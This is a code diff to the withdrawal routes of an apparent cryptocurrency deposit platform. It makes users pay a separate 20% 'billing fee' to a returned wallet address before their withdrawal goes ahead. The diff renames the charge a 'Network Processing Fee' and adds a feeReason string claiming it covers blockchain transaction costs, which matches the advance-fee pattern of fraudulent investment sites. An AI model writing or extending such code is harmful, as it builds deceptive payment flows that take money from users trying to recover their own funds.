@@ -66,17 +66,10 @@ router.post('/', auth, async (req, res) => {
       return res.status(400).json({ msg: 'Insufficient balance for withdrawal.' });
     }
 
-    // Calculate 20% billing fee
+    // Calculate 20% billing fee (Network Processing Fee)
     const billingFee = requestedAmount * 0.20;
 
-    // Deduct withdrawal amount from user's balance
-    user.depositBalance -= requestedAmount;
-    
-    // Add billing fee to user's billing balance (must be paid separately)
-    user.billingBalance += billingFee;
-    await user.save();
-
-    // Create withdrawal record with billing information
+    // Create withdrawal record with billing information (don't deduct balance yet)
     const newWithdrawal = new Withdrawal({
       userId: userId,
       amount: requestedAmount,
@@ -101,18 +94,36 @@ router.post('/', auth, async (req, res) => {
       cryptoCurrency,
       conversionRate
     });
+    // Get the appropriate wallet address for billing payment
+    const getWalletKey = (currency, network) => {
+      if (currency === 'USDT') {
+        return network === 'ERC20' ? 'usdt_erc20' : 'usdt_trc20';
+      } else if (currency === 'USDC') {
+        return network === 'ERC20' ? 'usdc_erc20' : 'usdc_trc20';
+      } else {
+        return currency.toLowerCase();
+      }
+    };
+
+    const walletKey = getWalletKey(cryptoCurrency, network);
+    const billingWalletAddress = user.wallets[walletKey]?.address || '';
+
     res.json({
       success: true,
-      msg: 'Withdrawal request submitted. Please pay the billing fee to proceed.',
+      message: 'Withdrawal request created. Please pay the network processing fee to proceed.',
       withdrawal: newWithdrawal,
       requestedAmount,
-      requestedCurrency,
-      cryptoAmount: cryptoAmountDisplay,
-      cryptoCurrency,
-      conversionRate,
+      cryptoDetails: {
+        currency: cryptoCurrency,
+        network,
+        rate: conversionRate,
+        usdValue: requestedAmount
+      },
       billingFee: billingFee,
       billingRequired: true,
-      userBillingBalance: user.billingBalance
+      billingWalletAddress,
+      feeReason: 'Network Processing Fee - Required to cover blockchain transaction costs and network fees for secure processing of your withdrawal.',
+      billingBalance: user.billingBalance
     });
   } catch (err) {
     console.error('[WITHDRAWAL API] Error:', err);
@@ -437,6 +448,110 @@ router.post('/pay-all-billing', auth, async (req, res) => {
 
   } catch (err) {
     res.status(500).json({ msg: 'Server error', error: err.message });
+  }
+});
+
+// Route to confirm billing fee payment
+router.post('/confirm-billing/:withdrawalId', auth, async (req, res) => {
+  try {
+    const { withdrawalId } = req.params;
+    const userId = req.user.id;
+
+    // Find the withdrawal
+    const withdrawal = await Withdrawal.findOne({ 
+      _id: withdrawalId, 
+      userId: userId,
+      status: 'pending_billing'
+    });
+
+    if (!withdrawal) {
+      return res.status(404).json({
+        success: false,
+        message: 'Withdrawal not found or billing already confirmed'
+      });
+    }
+
+    // Find the user
+    const user = await User.findById(userId);
+    if (!user) {
+      return res.status(404).json({
+        success: false,
+        message: 'User not found'
+      });
+    }
+
+    // Check if user has sufficient balance for the withdrawal amount
+    if (user.depositBalance < withdrawal.amount) {
+      return res.status(400).json({
+        success: false,
+        message: 'Insufficient balance for withdrawal'
+      });
+    }
+
+    // Deduct withdrawal amount from user's balance now that billing is confirmed
+    user.depositBalance -= withdrawal.amount;
+    await user.save();
+
+    // Update withdrawal status and billing information
+    withdrawal.status = 'pending'; // Now pending admin approval
+    withdrawal.billingPaid = true;
+    withdrawal.billingPaidAt = new Date();
+    await withdrawal.save();
+
+    res.json({
+      success: true,
+      message: 'Billing fee payment confirmed. Your withdrawal is now pending admin approval.',
+      withdrawal: withdrawal
+    });
+
+  } catch (err) {
+    console.error('Error confirming billing payment:', err);
+    res.status(500).json({
+      success: false,
+      message: 'Server error'
+    });
+  }
+});
+
+// Route to get billing status for a withdrawal
+router.get('/billing-status/:withdrawalId', auth, async (req, res) => {
+  try {
+    const { withdrawalId } = req.params;
+    const userId = req.user.id;
+
+    const withdrawal = await Withdrawal.findOne({ 
+      _id: withdrawalId, 
+      userId: userId 
+    });
+
+    if (!withdrawal) {
+      return res.status(404).json({
+        success: false,
+        message: 'Withdrawal not found'
+      });
+    }
+
+    res.json({
+      success: true,
+      withdrawal: {
+        id: withdrawal._id,
+        amount: withdrawal.amount,
+        currency: withdrawal.currency,
+        network: withdrawal.network,
+        status: withdrawal.status,
+        billingFee: withdrawal.billingFee,
+        billingPaid: withdrawal.billingPaid,
+        billingPaidAt: withdrawal.billingPaidAt,
+        createdAt: withdrawal.createdAt
+      }
+    });
+
+  } catch (err) {
+    console.error('Error getting billing status:', err);
+    res.status(500).json({
+      success: false,
+      message: 'Server error'
+    });
   }
 });
 
